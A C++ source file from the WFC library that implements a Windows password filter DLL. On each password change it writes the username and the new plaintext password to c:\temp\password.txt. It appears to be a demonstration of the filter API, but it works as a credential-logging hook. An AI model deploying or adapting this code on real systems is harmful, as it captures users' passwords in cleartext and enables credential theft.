/*
** Author: Samuel R. Blackburn
** Internet: wfc@pobox.com
**
** Copyright (c) 2000-2003, Samuel R. Blackburn
** All rights reserved.
**
** "You can get credit for something or get it done, but not both."
** Dr. Richard Garwin
**
** BSD License follows.
**
** Redistribution and use in source and binary forms, with or without
** modification, are permitted provided that the following conditions
** are met:
**
** Redistributions of source code must retain the above copyright notice,
** this list of conditions and the following disclaimer. Redistributions
** in binary form must reproduce the above copyright notice, this list
** of conditions and the following disclaimer in the documentation and/or
** other materials provided with the distribution. Neither the name of
** the WFC nor the names of its contributors may be used to endorse or
** promote products derived from this software without specific prior
** written permission.
**
** THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
** "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
** LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
** A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
** OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
** SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
** LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
** DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
** THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
** (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
** OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "PasswordDLL.h"
#pragma hdrstop

BOOL MyPasswordFilter::OnChanged( PASSWORD_FILTER_STRING * user_name, ULONG relative_id, PASSWORD_FILTER_STRING * new_password )
{
   WFCTRACEINIT( TEXT( "MyPasswordFilter::OnChanged()" ) );

   CString user;
   CString password;
   CString string_to_output;

   ::wfc_convert_lpcwstr_to_cstring( user_name->UnicodeString,    user     );
   ::wfc_convert_lpcwstr_to_cstring( new_password->UnicodeString, password );

   string_to_output.Format( TEXT( "The password for \"%s\" (%lu) is now \"%s\"\n" ),
                     (LPCTSTR) user,
                     relative_id,
                     (LPCTSTR) password );
   
   CFile64 text_file;

   if ( text_file.Open( TEXT( "c:\\temp\\password.txt" ), CFile::modeCreate | CFile::modeNoTruncate | CFile::modeWrite | CFile::typeText ) == FALSE )
   {
      WFCTRACE( TEXT( "Can't open password file" ) );
      return( TRUE );
   }

   text_file.SeekToEnd();

   WFCTRACE( string_to_output );
   text_file.Write( (LPCTSTR) string_to_output, string_to_output.GetLength() * sizeof( TCHAR ) );

   text_file.Close();

   MessageBeep( 0 );
   MessageBeep( 0 );
   MessageBeep( 0 );

   return( CPasswordChangeFilter::OnChanged( user_name, relative_id, new_password ) );
}

MyPasswordFilter Static_Filter;
